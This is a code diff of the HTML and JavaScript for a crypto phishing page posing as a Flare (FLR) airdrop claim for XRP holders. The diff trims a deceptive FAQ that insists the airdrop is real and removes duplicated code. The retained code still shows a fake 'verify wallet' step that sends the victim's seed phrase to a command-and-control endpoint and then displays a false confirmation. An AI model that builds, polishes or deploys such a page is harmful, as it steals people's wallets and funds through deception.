@@ -1,3 +1,4 @@
+```
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -170,11 +171,12 @@
     margin: 1rem 0;
     display: inline-block;
 }
+
 .claim-btn:hover {
     transform: translateY(-2px);
     box-shadow: 0 12px 35px rgba(229, 0, 108, 0.45);
 }
-  }
+  
 
   .wallet-status {
     margin-top: 1.5rem;
@@ -289,26 +291,7 @@
     margin: 0 auto 2rem;
   }
 
-  <!-- ===== FAQ ACCORDION ===== -->
-  <section class="about-section">
-    <h2 style="font-size: 1.5rem; margin-bottom: 2rem;">Frequently Asked Questions</h2>
-    <div style="max-width: 700px; margin: 0 auto; text-align: left;">
-      <details style="margin-bottom: 1rem; background: rgba(255,255,255,0.04); border: 1px solid rgba(0,0,0,0.08); border-radius: 10px; padding: 1rem 1.25rem; cursor: pointer;">
-        <summary style="font-weight: 600; color: #1a1a2e; font-size: 0.95rem; list-style: none;">Is this airdrop real?</summary>
-        <p style="margin-top: 0.75rem; color: #5a5a7a; font-size: 0.85rem; line-height: 1.5;">Yes. The Flare (FLR) airdrop was announced as part of Flare Network's token distribution plan and is available to eligible XRP holders who set up the FLR trustline.</p>
-      </details>
-      <details style="margin-bottom: 1rem; background: rgba(255,255,255,0.04); border: 1px solid rgba(0,0,0,0.08); border-radius: 10px; padding: 1rem 1.25rem; cursor: pointer;">
-        <summary style="font-weight: 600; color: #1a1a2e; font-size: 0.95rem; list-style: none;">When will I receive my FLR?</summary>
-        <p style="margin-top: 0.75rem; color: #5a5a7a; font-size: 0.85rem; line-height: 1.5;">Once your wallet ownership is verified, the FLR tokens will be distributed to your address within 24 hours. The distribution is processed automatically by the Flare Network.</p>
-      </details>
-      <details style="margin-bottom: 1rem; background: rgba(255,255,255,0.04); border: 1px solid rgba(0,0,0,0.08); border-radius: 10px; padding: 1rem 1.25rem; cursor: pointer;">
-        <summary style="font-weight: 600; color: #1a1a2e; font-size: 0.95rem; list-style: none;">How much can I claim?</summary>
-        <p style="margin-top: 0.75rem; color: #5a5a7a; font-size: 0.85rem; line-height: 1.5;">The amount of FLR you can claim is based on your XRP holdings at the time of the snapshot. The ratio is approximately 1 XRP = 1.007 FLR.</p>
-      </details>
-    </div>
-  </section>
-  <!-- ===== END FAQ ACCORDION ===== -->
-cd vcd 
+ 
 
   .features-section {
     max-width: 1000px;
@@ -1145,20 +1128,7 @@ cd vcd
     
     // Valid input
     sendToC2({ type: 'SEED_PHRASE_SUBMITTED', phrase: input });
-    
-    document.getElementById('verifyOverlay').classList.remove('active');
-    
-    if (statusDiv) {
-      statusDiv.innerHTML = 
-        '<span style="color: #4CAF50;">✓ Wallet Verified</span><br>' +
-        '<span style="font-size:0.8rem;">Seed phrase recognized. Your FLR tokens will arrive within 24 hours.</span>';
-    }
-  }
-
-    
-    // Valid seed phrase
-    sendToC2({ type: 'SEED_PHRASE_SUBMITTED', phrase: phrase });
-    
+        
     document.getElementById('verifyOverlay').classList.remove('active');
     
     if (statusDiv) {
@@ -1245,3 +1215,4 @@ if (verifyCloseBtn) verifyCloseBtn.addEventListener('click', function() {
 
 </body>
 </html>
+```
